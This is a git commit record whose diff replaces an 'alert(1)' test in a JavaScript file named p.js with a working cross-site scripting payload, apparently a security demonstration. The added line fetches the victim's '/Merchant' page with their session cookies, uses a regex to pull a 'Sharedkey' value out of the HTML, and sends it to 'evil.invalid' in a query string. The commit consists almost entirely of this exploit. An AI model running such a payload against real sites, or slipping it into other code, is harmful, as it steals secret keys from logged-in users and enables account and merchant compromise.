faf5e3c7fb061968400bfd408daebc21af00c1c6
bjolarOmegapoint <101254945+bjolarOmegapoint@users.noreply.github.com>
2024-06-11 13:52:20 +0200

    Update p.js

--- p.js
+++ p.js
@@ -1,1 +1,1 @@
-alert(1)
+fetch("/Merchant",{credentials: 'include'}).then(response=>response.text()).then(data=>{ fetch('https://evil.invalid/?leaked-sharedkey='+data.match(/<b>Sharedkey<\/b><\/td><td>(.)+?<\/td>/g)[0].slice(26,-5));});
